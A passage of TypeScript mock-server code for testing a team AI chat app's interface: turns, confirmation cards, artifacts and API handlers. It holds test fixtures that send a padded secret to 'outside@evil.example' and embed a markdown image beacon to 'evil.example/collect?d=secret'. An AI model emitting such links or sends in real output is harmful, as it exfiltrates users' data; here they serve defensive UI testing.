      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      if (request.kind === 'dev_env_site' && answer === 'always') {
        const mine = this.devEnvSites.get(user.id) ?? { sites: [], full: false }
        if (!mine.sites.some((x) => x.host === request.host)) mine.sites.push({ host: request.host, createdAt: now() })
        this.devEnvSites.set(user.id, mine)
      }
      prompt += ` answered:${JSON.stringify(answer)}`
    }
    if (/connecttemplate/i.test(prompt)) {
      // like server/src/chat/connect-service.ts: the connect card for an admin's template this person has not connected
      // (the person's own key, the template's address); it stays until the turn's time for it runs out
      const t = this.integrationTemplates.find((x) => this.templateCovers(x, user) && !this.integrations.some((y) => y.templateId === x.id && y.ownerId === user.id))
      if (t) {
        const requestId = 'ct1'
        const request: TurnRequest = {
          kind: 'connect_service', requestId, target: 'service', name: t.name, scope: 'personal',
          service: { kind: t.kind, url: t.url, host: new URL(t.url).host, auth: t.auth, authHeader: t.authHeader }, template: { id: t.id, version: t.version },
          why: `You asked for your ${t.name} pages.`, expiresAt: new Date(Date.now() + 60_000).toISOString(),
        }
        this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
        pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
        await Promise.race([new Promise((r) => this.pendingAsk.set(turnId, r)), sleep(60_000)])
        this.openAsks.delete(turnId)
        pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      }
    }
    if (/sendcard/i.test(prompt)) {
      // like server/src/integrations/connections/tools.ts gate: everything a connected service is sent, where it goes first
      const requestId = 'w1'
      const payload = JSON.stringify({ title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy ' + 'x'.repeat(2000) + ' SECRET-AT-THE-END', to: 'outside@evil.example' }, null, 2)
      const request: TurnRequest = {
        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
        question: 'AI가 Tasks에서 이 작업을 하려고 해요: create_task\n\n보낼 내용 전체와 받는 곳을 아래에서 확인해 주세요.\n\n보낼까요?',
        options: [{ label: '보내기', value: 'allow' }, { label: '보내지 않기', value: 'deny' }],
        details: [{ label: '보낼 내용', text: payload, fields: [{ name: 'to', value: 'outside@evil.example' }], marks: ['c2fsyxj5ltk4nzy1ndmy'] }],
      }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      prompt += ` answered:${JSON.stringify(answer)}`
    }
    if (/skillsave/i.test(prompt)) {
      // like server/src/chat/turn.ts confirmSkillWrite: the server's card before anything is saved under skills/
      const requestId = 'k1'
      const after = '---\nname: 주간 보고서\ndescription: 이번 주 회의록으로 보고서를 만든다\n---\n1. 회의록을 읽는다\n2. 표로 정리한다\n'
      const request: TurnRequest = {
        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
        question: '팀 스킬/규칙으로 저장할까요? 팀 전체 AI가 따라요.\n\nskills/weekly.md (새 팀 스킬 "주간 보고서")',
        options: [{ label: '저장', value: 'save' }, { label: '저장하지 않기', value: 'skip' }],
        preview: { kind: 'skill_write', path: 'skills/weekly.md', isNew: true, skillName: '주간 보고서', diff: '@@ -0,0 +1,6 @@\n' + after.trimEnd().split('\n').map((l) => '+' + l).join('\n'), added: 6, removed: 0, truncated: false },
      }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      const saved = answer === 'save' || (Array.isArray(answer) && answer[0] === 'save')
      if (saved) {
        this.putFile('skills/weekly.md', after)
        this.skillChange({ id: uuidv7(), at: now(), actor: { id: user.id, name: user.name }, path: 'skills/weekly.md', change: 'create', from: null, byAi: true, kind: 'skill' })
      }
      const text = saved ? 'Saved skills/weekly.md.' : 'Not saved: you did not allow saving under skills/.'
      assistant.content = text
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: 0, text } })
      assistant.status = 'done'
      if (saved) assistant.files = { saved: [{ path: 'skills/weekly.md', action: 'create' }], conflicts: [], rejected: [] }
      const chat = this.chats.find((c) => c.id === chatId)!
      chat.runState = 'idle'
      if (!chat.title) chat.title = 'skill'
      pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: 'done', message: this.view(assistant) } })
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
      return
    }
    if (/artifact|react/i.test(prompt)) {
      const react = /react/i.test(prompt)
      const key = react ? 'counter' : 'hello-page'
      let content = react && /d3/i.test(prompt)
        ? 'import * as d3 from "d3"\nexport default function App() {\n  return <p>{d3.sum([1, 2])}</p>\n}\n'
        : react
        ? 'import { useState } from "react"\nimport { Plus } from "lucide-react"\nexport default function App() {\n  const [n, setN] = useState(0)\n  return <button className="rounded bg-emerald-600 px-3 py-2 text-white" onClick={() => setN(n + 1)}><Plus size={14} /> count {n}</button>\n}\n'
        : /broken/i.test(prompt)
          ? '<h1>Broken</h1><script>throw new Error("boom")</script>'
          : /wander/i.test(prompt)
            ? `<h1>Wanderer</h1><script>setTimeout(function () { location.href = ${JSON.stringify(/home/i.test(prompt) ? "/" : "https://example.com/")} }, 1500)</script>`
          : '<h1 id="t">Hello artifact</h1><script>document.getElementById("t").textContent += " (ran)"; fetch("https://example.com/x").catch(()=>{})</script>'
      const injected = this.nextArtifact
      this.nextArtifact = null
      const type = injected?.type ?? (react ? ('react' as const) : ('html' as const))
      if (injected) content = injected.content
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: react ? 'Counter' : 'Hello page', status: 'writing', content: content.slice(0, 20), artifact: null } })
      await sleep(120)
      const prev = this.artifacts.filter((a) => a.chatId === chatId && a.key === key)
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key, version: prev.length + 1, type, title: react ? 'Counter' : 'Hello page', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    if (/^\/promo-video\b/.test(prompt)) {
      // like the team server (server/src/promo-video/tool.ts): the promo video arrives saved, with no "writing" previews
      const content = '<!DOCTYPE html><html lang="ko"><body><div class="pv"><h1>조용한 책상 선풍기</h1></div></body></html>'
      const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === PROMO_ARTIFACT_KEY).length + 1
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: PROMO_ARTIFACT_KEY, version, type: 'html', title: 'Acme 홍보 영상', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    if (/^\/intro-deck\b/.test(prompt)) {
      // like the team server (server/src/intro-deck/): the intro deck arrives saved, with no "writing" previews
      const content = '<!DOCTYPE html><html lang="ko"><body><section class="slide" aria-roledescription="slide"><h1>조용한 책상 선풍기</h1></section></body></html>'
      const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === DECK_ARTIFACT_KEY).length + 1
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: DECK_ARTIFACT_KEY, version, type: 'html', title: 'Acme 회사 소개서', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    if (/^\/card-news\b/.test(prompt)) {
      // like the team server (server/src/tools/artifact.ts): the card news arrives saved, with no "writing" previews
      const content = '<!DOCTYPE html><html lang="ko"><body><section class="card"><h1>조용한 책상 선풍기</h1></section></body></html>'
      const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === CARD_NEWS_ARTIFACT_KEY).length + 1
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: CARD_NEWS_ARTIFACT_KEY, version, type: 'html', title: 'Acme 카드뉴스', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    const capped = /cap-tools/i.test(prompt) ? 'tool_limit' as const : /cap-time/i.test(prompt) ? 'time_limit' as const : null
    // the time limit stops a step that is still running (a long read): like turn.ts, it ends paused, not failed;
    // "stop-cut": a step still running when the person presses Stop ends stopped, not failed
    const cut = capped === 'time_limit' || /stop-cut/i.test(prompt) ? step({ id: 's-cut', kind: 'tool', tool: 'read', label: 'read applications/21.pdf' }) : null
    if (cut) {
      assistant.steps = [...assistant.steps, cut]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: cut } })
    }
    const text = /error/i.test(prompt)
      ? ''
      : capped
        ? 'Sorting the applications into the table.\n\n- Read 20 of 40 so far\n- Scored each one against the job description\n- Saved the first half to the shared sheet\n\nThe rest are still in the folder; this answer stopped before reaching them.'
      : /sources/i.test(prompt)
        ? '매출은 [report.pdf · p.4](/files/view?path=docs%2Fsources%2Freport.pdf&page=4)에 있어요. 채널별 금액은 [budget.xlsx · 시트 \'매출\' A40:C44](/files/view?path=docs%2Fsources%2Fbudget.xlsx&sheet=%EB%A7%A4%EC%B6%9C&range=A40:C44)을 보면 돼요.'
      : prompt.includes('answered:')
        ? `You chose ${prompt.split('answered:')[1]}.`
        : /artifact|react/i.test(prompt)
          ? 'I made an artifact for you.'
          : `Here is **the answer** for: ${prompt.slice(0, 40)}\n\n| name | value |\n|---|---|\n| alpha | 1 |\n| beta | 2 |\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\nMath: $x^2 + 1$ and a price of $5.\n\n![chart](https://evil.example/collect?d=secret)\n\n\`\`\`mermaid\ngraph TD; A-->B\n\`\`\`\n\n[plan](/api/files/download?path=marketing%2Fplan.md)\n`
    const chunks = text.match(/[\s\S]{1,12}/g) ?? []
    for (const piece of chunks) {
      if (this.stopped.has(turnId)) break
      const offset = assistant.content.length
      assistant.content += piece
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset, text: piece } })
      await sleep(slow ? 150 : 15)
    }
    assistant.status = this.stopped.has(turnId) ? 'stopped' : /error/i.test(prompt) ? 'error' : 'done'
    // like server/src/chat/turn.ts at a per-answer limit: 'done', not an error, with the reason
    if (assistant.status === 'done' && capped) assistant.stopReason = capped
    if (cut) assistant.steps = assistant.steps.map((x) => (x.id === cut.id ? { ...x, status: 'error' as const, endedAt: now(), ...(assistant.stopReason ? { paused: true as const } : assistant.status === 'stopped' ? { stopped: true as const } : {}) } : x))
    // like a fresh engine session (Codex every turn, an edit): history before this message past 40,000 characters
    // reaches the AI only in part (server/src/chat/prompt.ts historyWindow)
    let earlier = 0
    const asked = this.messages.find((m) => m.id === assistant.parentId)
    for (let cur = asked ? this.messages.find((m) => m.id === asked.parentId) : undefined; cur; cur = this.messages.find((m) => m.id === cur!.parentId)) earlier += cur.content.length + 'Assistant: '.length
    if (assistant.status !== 'error' && earlier > 40_000) assistant.historyTrimmed = true
    if (assistant.status === 'error') {
      assistant.error = { code: 'engine_unavailable', message: ERROR_MESSAGES.engine_unavailable.ko }
      // Stored chat-error fixtures, delivered through both message.done and listMessages.
      const fixture = /^(legacy )?error:(\w+)\n/.exec(prompt)
      if (fixture && Object.hasOwn(CHAT_ERROR_MESSAGES, fixture[2]!)) {
        const reason = fixture[2] as ChatErrorReason
        const text = CHAT_ERROR_MESSAGES[reason]
        assistant.error = { code: text.code, message: text.ko, ...(fixture[1] ? {} : { params: { reason } }) }
      } else if (fixture?.[2] === 'unknown') assistant.error.message = 'Unknown upstream failure'
      else if (fixture?.[2] === 'future') assistant.error.params = { reason: 'future_failure' }
    }
    if (/sources/i.test(prompt)) {
      // like server/src/files/sources.ts: what the answer read or saw passages of, a sub-agent's read marked; one file
      // nobody can open (secret/) only counts
      const list: MessageSourceFile[] = [
        { path: 'docs/sources/report.pdf', name: 'report.pdf', locs: [{ kind: 'page', page: 4 }, { kind: 'page', page: 5 }], via: ['read', 'search'] },
        { path: 'docs/sources/budget.xlsx', name: 'budget.xlsx', locs: [{ kind: 'sheet', sheet: '매출', range: 'A40:C44' }], via: ['search'] },
        { path: 'docs/sources/deck.pptx', name: 'deck.pptx', locs: [{ kind: 'slide', slide: 5 }], via: ['read'], subagent: true },
        { path: 'marketing/plan.md', name: 'plan.md', locs: [], via: ['grep'] },
        { path: 'secret/payroll.csv', name: 'payroll.csv', locs: [], via: ['read'] },
      ]
      this.sources.set(assistant.id, list)
      assistant.sourceCount = list.length
    }
    if (/files/i.test(prompt)) {
      this.putFile('marketing/report.md', '# Report\n')
      assistant.files = { saved: [{ path: 'marketing/report.md', action: 'create' }], conflicts: [{ path: 'marketing/plan.md', copyPath: 'marketing/plan (충돌 사본 - AI).md' }], rejected: [{ path: 'finance/2026/q3.csv', reason: 'read only' }] }
      pub({ type: 'files.changed', data: { changes: [{ path: 'marketing/report.md', action: 'create', by: null, turnId }] } })
    }
    assistant.usage = { inputTokens: 100, outputTokens: 50, costUsd: 0.001 }
    assistant.model = 'claude-sonnet'
    assistant.engine = 'claude-code'
    const chat = this.chats.find((c) => c.id === chatId)!
    chat.runState = 'idle'
    chat.updatedAt = now()
    if (!chat.title) chat.title = prompt.slice(0, 30)
    this.queueRevision++
    pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
    void user
  }

  startTurn(chatId: string, user: User, prompt: string, parentId: string): Message {
    const chat = this.chats.find((c) => c.id === chatId)!
    const turnId = uuidv7()
    const assistant = this.message({ chatId, role: 'assistant', parentId, status: 'streaming', turnId, engine: chat.engine })
    this.activeLeaf.set(chatId, assistant.id)
    if (/queue-hold/.test(prompt)) this.queuePositions.set(chatId, 3)
    chat.runState = this.queuePositions.has(chatId) ? 'queued' : 'running'
    this.queueRevision++
    const gen = this.generation
    // a reset in between abandons the turn (its chat is gone)
    this.runTurn(chatId, user, prompt, assistant).catch((e) => { if (gen === this.generation) console.error('mock turn failed', e) })
    return assistant
  }

  // ---------------- handlers ----------------
  handlers: Partial<Record<ApiName, Handler>> = {
    frequentQuestions: () => ({ items: [], days: 30, sampled: false }),
    // like server/src/skills/popular.ts: only skills the caller can read now, with their title
    popularSkills: (c) => ({ items: this.popular.flatMap((p) => { const s = this.skillsFor(c.user).find((x) => x.path === p.path && !x.personal); return s ? [{ ...s, uses: p.uses, users: p.users }] : [] }), days: 30 }),
    listSkillIssues: () => ({ items: [] }),
    // the "/" menu, the Skills page and the owner's checklist on the home screen: like the server, the skills the caller
    // can read (none in the seed; POST /__test/skills adds some)
    listSkills: (c) => ({ items: this.skillsFor(c.user) }),
    health: () => ({ ok: true, version: this.serverVersion, schema: { applied: 2, readerLevel: 1 }, uptimeSec: 1, time: now() }),
    setupStatus: () => ({ needed: this.setupNeeded, teamName: this.setupNeeded ? null : this.settings.teamName, defaultLocale: this.settings.defaultLocale }),
    setup: (c) => {
      if (!this.setupNeeded) fail('conflict', 409)
      if (c.body.setupToken !== 'setup-token-0123456789') fail('forbidden', 403, 'wrong setup token')
      this.setupNeeded = false
      this.settings.teamName = c.body.teamName
      this.settings.defaultLocale = c.body.locale
      // like the server: the browser's time zone becomes the team's
      if (typeof c.body.timeZone === 'string') this.settings.timeZone = c.body.timeZone
      const u = this.addUser({ id: c.body.owner.username.toLowerCase().replace(/[^a-z0-9_-]/g, ''), username: c.body.owner.username, name: c.body.owner.name, role: 'owner', groupIds: [] }, c.body.owner.password)
      this.files.set('users', { type: 'folder', mtime: now() })
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },
    login: (c) => {
      const u = this.users.find((x) => x.username === c.body.username)
      // like the server: before sign-in, the page's language header, else the team default
      const loc = Locale.safeParse(c.req.headers.get(LOCALE_HEADER)).data ?? this.settings.defaultLocale
      const wrong = { ko: '아이디나 비밀번호가 맞지 않아요.', en: 'Wrong username or password.', id: 'Nama pengguna atau kata sandi salah.', ja: 'ユーザー名またはパスワードが正しくありません。', es: 'El nombre de usuario o la contraseña son incorrectos.' }[loc]
      if (!u || this.passwords.get(u.username) !== c.body.password) fail('unauthorized', 401, wrong)
      if (u!.mustChangePassword) this.tempLogins.add(u!.id)
      else this.tempLogins.delete(u!.id)
      return { cookie: this.startSession(u!), body: { me: this.me(u!, '') } }
    },
    logout: () => ({ cookie: `${DEV_SESSION_COOKIE}=; Path=/; Max-Age=0`, body: undefined }),
    me: (c) => this.me(c.user, ''),
    // team chat rooms and the people directory (the sidebar and the phone's 대화 tab read them on every page): like a
    // server whose people are in no room yet, and the active people by name only (server/src/routes/people.ts)
    listRooms: () => ({ items: [] }),
    // Slack (docs/SLACK.md): a team that uses Slack, nobody linked yet, "Sign in with Slack" not set up: Settings › 앱
    // 커넥터 shows the Slack line with how to get a link; Admin › Slack shows a connected app
    mySlack: () => ({ available: true, workspace: 'Acme', link: null, signIn: false, emailSetByOther: false }),
    slackAdmin: () => ({
      enabled: true, tokens: true, workspace: { teamId: 'T0ACME', name: 'Acme', url: 'https://acme.slack.com' }, botName: 'trina', appId: 'A0ACME',
      state: 'connected', lastError: null, linkOrigin: 'http://127.0.0.1', linked: 0, manifest: '{}', createUrl: 'https://api.slack.com/apps?new_app=1',
      signIn: false, redirectUrl: null,
    }),
    listPeople: () => ({ people: this.users.filter((u) => u.status === 'active').map((u) => ({ id: u.id, name: u.name })) }),
    updateMe: (c) => {
      const u = c.user as User & { prefs?: Me['user']['prefs'] }
      if (c.body.name) u.name = c.body.name
      if (c.body.locale !== undefined) u.localeChoice = c.body.locale
      this.syncLocales()
      if (c.body.locale !== undefined) this.publish(LOCALE_CHANGED)
      if (c.body.email !== undefined) u.email = c.body.email
      if (c.body.prefs) {
        const next: Record<string, unknown> = { ...u.prefs, ...c.body.prefs }
        if (!this.canChoose(u)) { delete next.engine; delete next.model }
        for (const [k, v] of Object.entries(next)) if (v === undefined || v === null) delete next[k]
        u.prefs = next as Me['user']['prefs']
      }
      return this.me(u, '')
    },
    changePassword: (c) => {
      // like the server: no current password only right after signing in with a temporary one
      if (c.body.currentPassword === undefined) {
        if (!(c.user.mustChangePassword && this.tempLogins.has(c.user.id))) fail('validation', 400, 'current password required')
      } else if (this.passwords.get(c.user.username) !== c.body.currentPassword) fail('forbidden', 403, 'wrong password')
      this.passwords.set(c.user.username, c.body.newPassword)
      c.user.mustChangePassword = false
      this.tempLogins.delete(c.user.id)
      return { ok: true }
    },
    // Settings > Usage: made-up numbers for whoever is signed in (the real server reads only the caller's own turns,
    // tests/unit/a-my-usage.test.ts); the owner has a monthly limit of their own and a group's daily one
    myUsage: (c) => {
      const mine = c.user.id === 'olga'
      const end = new Date(Date.now() + 5 * 86400_000).toISOString()
      return {
        period: c.query.period ?? 'month', from: now(), to: now(),
        totals: mine ? { turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 } : { turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 },
        byModel: mine
          ? [{ key: 'claude-code:sonnet', engine: 'claude-code', model: 'sonnet', turns: 9, inputTokens: 9000, outputTokens: 2600, costUsd: 0.3 }, { key: 'codex:', engine: 'codex', model: null, turns: 3, inputTokens: 3000, outputTokens: 800, costUsd: 0.12 }]
          : [{ key: 'claude-code:sonnet', engine: 'claude-code', model: 'sonnet', turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 }],
        limits: mine
          ? [{ scope: 'you', name: null, period: 'month', usedPct: 42, action: 'block', exceeded: false, resetsAt: end }, { scope: 'group', name: 'Design', period: 'day', usedPct: 12.5, action: 'warn', exceeded: false, resetsAt: end }]
          : [],
      }
    },
    mySessions: () => ({ items: [{ id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', createdAt: now(), lastSeenAt: now(), expiresAt: now(), current: true }] }),
    inviteInfo: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token)
      if (!i) fail('not_found', 404)
      return { teamName: this.settings.teamName, role: i!.role, expiresAt: i!.expiresAt, valid: !i!.usedAt }
    },
    acceptInvite: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token && !x.usedAt)
      if (!i) fail('gone', 410)
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: i!.role, groupIds: i!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
      i!.usedAt = now()
      i!.usedBy = { id: u.id, name: u.name }
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },

    listChats: (c) => {
      const q = (c.query.q ?? '').toLowerCase()
      const trash = c.query.trash === '1' || c.query.trash === 'true'
      let list = this.chats.filter((x) => !!x.deletedAt === trash)
      if (c.query.projectId) list = list.filter((x) => x.projectId === c.query.projectId)
      if (q) list = list.filter((x) => x.title.toLowerCase().includes(q) || this.messages.some((m) => m.chatId === x.id && m.content.toLowerCase().includes(q)))
      return { items: [...list].sort((a, b) => (a.updatedAt < b.updatedAt ? 1 : -1)), nextCursor: null }
    },
    chatEngines: (c) => {
      const e = this.enginesResponse()
      const canChoose = this.canChoose(c.user)
      return {
        canChoose, defaultEngine: this.settings.defaultEngine, defaultModel: this.settings.defaultModel,
        engines: canChoose ? e.engines.filter((x) => x.enabled).map((x) => ({ id: x.id, label: x.label, models: x.models })) : [],
      }
    },
    createChat: (c) => {
      this.guardEngine('createChat', c.user, c.body, { engine: this.settings.defaultEngine, model: this.settings.defaultModel })
      const chat: Chat = { id: uuidv7(), projectId: c.body.projectId ?? null, title: c.body.title ?? '', engine: c.body.engine ?? 'claude-code', model: c.body.model ?? null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
      this.chats.push(chat)
      return { status: 201, body: chat }
    },
    getChat: (c) => this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404),
    getChatQueue: (c) => {
      const assistant = this.messages.find(m => m.chatId === c.params.id && m.status === 'streaming')
      const position = assistant ? this.queuePositions.get(c.params.id!) ?? 0 : null
      return { state: position === null ? 'idle' : position > 0 ? 'queued' : 'running',
        turnId: assistant?.turnId ?? null, messageId: assistant?.id ?? null, position, epoch: this.epoch, revision: this.queueRevision }
    },
    updateChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.guardEngine('updateChat', c.user, c.body, chat)
      Object.assign(chat, Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined)))
      return chat
    },
    deleteChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = now()
      return { id: chat.id, deletedAt: chat.deletedAt, purgeAt: new Date(Date.now() + 7 * 86400_000).toISOString() }
    },
    restoreChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = null
      return chat
    },
    listMessages: (c) => ({ items: this.path(c.params.id!), nextCursor: null }),
    messageSources: (c) => {
      const m = this.messages.find((x) => x.id === c.params.messageId && x.chatId === c.params.id) ?? fail('not_found', 404)
      const files: MessageSourceFile[] = []
      let unavailable = 0
      for (const f of this.sources.get(m.id) ?? []) {
        if (this.files.get(f.path)?.type === 'file' && this.access(f.path, c.user) !== 'none') files.push(f)
        else unavailable++
      }
      return { files, unavailable }
    },
    listTurnRequests: (c) => ({ items: [...this.openAsks.values()].filter((r) => r.chatId === c.params.id) }),
    sendMessage: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const dup = this.messages.find((m) => (m as Message & { cmid?: string }).cmid === c.body.clientMessageId)
      if (dup) fail('conflict', 409)
      this.guardEngine('sendMessage', c.user, c.body, chat)
      if (c.body.engine) chat.engine = c.body.engine
      if (c.body.model !== undefined) chat.model = c.body.model ?? null
      // like the server when the person's "block" usage limit is used up (refused before anything is queued)
      if (String(c.body.content).includes('over my limit')) fail('budget_exceeded', 429, '오늘 AI 사용 한도를 다 썼어요. 10월 22일 오전 12:00부터 다시 쓸 수 있어요.')
      // like a chat used while Safe operations 1A is on: it stays confidential (server/src/safe-ops/confidential.ts)
      if ((this.allConfidential || /confidential/i.test(String(c.body.content))) && !chat.confidential) {
        chat.confidential = true
        this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
      }
      const parentId = c.body.parentId ?? this.activeLeaf.get(chat.id) ?? null
      const atts = (c.body.attachmentIds as string[]).map((id) => this.attachments.get(id)).filter(Boolean).map((a) => { const { data: _d, ...rest } = a!; return rest })
      const user = this.message({ chatId: chat.id, role: 'user', parentId, content: c.body.content, attachments: atts, author: { id: c.user.id, name: c.user.name } })
      ;(user as Message & { cmid?: string }).cmid = c.body.clientMessageId
      if (/^fail-send/.test(c.body.content)) fail('internal', 500, 'send failed on purpose')
      const assistant = this.startTurn(chat.id, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: this.queuePositions.get(chat.id) ?? 0, queueEpoch: this.epoch, queueRevision: this.queueRevision } }
    },
    stop: (c) => {
      const running = this.messages.find((m) => m.chatId === c.params.id && m.status === 'streaming')
      if (running?.turnId) this.stopped.add(running.turnId)
      return { stopped: !!running, turnId: running?.turnId ?? null }
    },
    regenerate: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      const userMsg = this.messages.find((m) => m.id === old.parentId)!
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.guardEngine('regenerate', c.user, c.body, chat)
      if (c.body.engine) chat.engine = c.body.engine
      if (c.body.model !== undefined) chat.model = c.body.model ?? null
      const assistant = this.startTurn(c.params.id!, c.user, userMsg.content, userMsg.id)
      return { status: 202, body: { userMessage: null, assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    editMessage: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      this.guardEngine('editMessage', c.user, c.body, this.chats.find((x) => x.id === old.chatId)!)
      const user = this.message({ chatId: old.chatId, role: 'user', parentId: old.parentId, content: c.body.content, author: { id: c.user.id, name: c.user.name } })
      const assistant = this.startTurn(old.chatId, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    selectBranch: (c) => {
      this.activeLeaf.set(c.params.id!, this.newestLeafUnder(c.body.messageId))
      return { items: this.path(c.params.id!), nextCursor: null }
    },
    answerTurn: (c) => {
      const r = this.pendingAsk.get(c.params.id!)
      // like server/src/routes/chats.ts: answered already (another window) or closed
      if (!r) fail('conflict', 409, '이미 답했거나 시간이 지난 질문이에요.')
      this.pendingAsk.delete(c.params.id!)
      r!(c.body.kind === 'ask_user' ? c.body.answer : c.body.decision)
      return undefined
    },
    listProjects: () => ({ items: this.projects }),
    createProject: (c) => {
      const p: Project = { id: uuidv7(), name: c.body.name, folderPath: c.body.folderPath ?? (c.body.scope === 'personal' ? `users/${c.user.id}/projects/${c.body.name}` : `projects/${c.body.name}`), instructions: c.body.instructions ?? '', createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), canEdit: true }
      this.projects.push(p)
      return { status: 201, body: p }
    },
    getProject: (c) => this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404),
    updateProject: (c) => Object.assign(this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteProject: (c) => {
      this.projects = this.projects.filter((p) => p.id !== c.params.id)
      return undefined
    },
    // the dev environment (experiment) of a project, on after POST /__test/dev-env
    devEnv: (c) => this.devEnvOf(c.user, c.params.id!),
    devEnvActivity: (c) => {
      this.devEnvOf(c.user, c.params.id!)
      const by = { id: c.user.id, name: c.user.name }
      return { items: [
        { at: now(), by, kind: 'command' as const, text: 'npx remotion render src/index.ts Teaser out/teaser.mp4', detail: null },
        { at: now(), by, kind: 'files' as const, text: 'created out/teaser.mp4', detail: null },
        { at: now(), by: null, kind: 'box' as const, text: 'box stopped (idle)', detail: null },
      ] }
    },
    devEnvBox: (c) => {
      this.devEnvOf(c.user, c.params.id!)
      this.devEnv!.box = c.body.action === 'stop' ? 'stopped' : 'running'
      return this.devEnvOf(c.user, c.params.id!)
    },
    devEnvRunStop: (c) => {
      this.devEnvOf(c.user, c.params.id!)
      const srt = this.devEnv!.srt
      if (!srt) fail('not_found', 404)
      srt!.running = srt!.running.filter((r) => r.id !== c.params.runId)
      srt!.waiting = srt!.waiting.filter((r) => r.id !== c.params.runId)
      return this.devEnvOf(c.user, c.params.id!)
    },
    // the team setting (Team settings › Dev environment): like server/src/routes/dev-env.ts, turning on (srt) needs the
    // current warning accepted
    devEnvTeam: () => this.devEnvTeamView(),
    myDevEnvSites: (c) => this.devEnvSitesOf(c.user.id),
    removeMyDevEnvSite: (c) => {
      const mine = this.devEnvSitesOf(c.user.id) && this.devEnvSites.get(c.user.id)!
      if (!mine.sites.some((x) => x.host === c.body.host)) fail('not_found', 404)
      mine.sites = mine.sites.filter((x) => x.host !== c.body.host)
